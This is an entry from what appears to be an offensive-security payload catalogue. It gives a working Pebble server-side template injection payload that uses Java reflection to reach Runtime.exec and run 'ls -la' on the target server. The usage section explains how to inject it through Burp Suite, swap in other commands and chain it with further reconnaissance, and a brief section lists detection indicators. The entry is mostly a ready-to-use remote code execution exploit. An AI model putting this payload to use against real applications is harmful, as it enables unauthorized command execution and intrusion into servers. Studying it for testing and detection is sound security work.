---
type: code
language: java
verified: true
created_at: '2023-04-06T03:56:40.140855+00:00'
updated_at: '2023-04-10T20:23:38.900029+00:00'
platforms:
  - Web
  - Java
  - Linux
tags:
  - SSTI
  - Pebble
  - RCE
  - Reconnaissance
validated: true
---

# Pebble-SSTI-List-Files-Directories

## Code

```java
{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('ls -la') }}
```

## Description

This Pebble template injection payload uses Java reflection to access the Runtime class and execute a shell command for listing files and directories in long format. It is designed for SSTI exploitation in Pebble-enabled web applications to perform initial reconnaissance by revealing the server's directory structure.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $_COMMAND | The shell command to execute (embedded in the payload) | `ls -la` |

## Usage

Inject this payload into a vulnerable template parameter (e.g., a search field or user input) in a Pebble-based application. Use a proxy like Burp Suite to modify requests. The command output will be rendered in the HTTP response if the injection succeeds. Customize the command for different OS (e.g., 'dir' on Windows) and chain with other reconnaissance to map the file system.

## Detection

- Web application logs showing template evaluation errors or unexpected Java reflection calls (e.g., forName('java.lang.Runtime')).
- Anomalous command outputs in HTTP responses, such as directory listings.
- WAF alerts for SSTI patterns like '{{' or 'getClass()'. Monitor process execution logs for 'ls' or similar from web server processes.

## Related

- [[procedures/Pebble-Server-Side-Template-Injection-Code-Execution]]
